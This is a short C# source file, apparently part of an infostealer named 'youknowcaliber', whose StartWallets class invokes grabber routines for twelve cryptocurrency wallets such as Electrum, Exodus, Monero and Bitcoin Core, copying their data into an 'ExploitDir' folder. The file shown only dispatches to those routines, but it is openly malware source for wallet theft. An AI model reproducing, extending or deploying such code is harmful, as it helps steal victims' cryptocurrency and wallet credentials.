﻿using System;

namespace youknowcaliber
{
	internal class StartWallets
	{
		public static void Start()
		{
			string exploitDir = Help.ExploitDir;
			try
			{
				Armory.ArmoryStr(exploitDir);
				AtomicWallet.AtomicStr(exploitDir);
				BitcoinCore.BCStr(exploitDir);
				Bytecoin.BCNcoinStr(exploitDir);
				DashCore.DSHcoinStr(exploitDir);
				Electrum.EleStr(exploitDir);
				Ethereum.EcoinStr(exploitDir);
				LitecoinCore.LitecStr(exploitDir);
				Monero.XMRcoinStr(exploitDir);
				Exodus.ExodusStr(exploitDir);
				Zcash.ZecwalletStr(exploitDir);
				Jaxx.JaxxStr(exploitDir);
			}
			catch (Exception arg)
			{
				Console.WriteLine(arg + "The start of the grabber with wallets failed");
			}
		}
	}
}
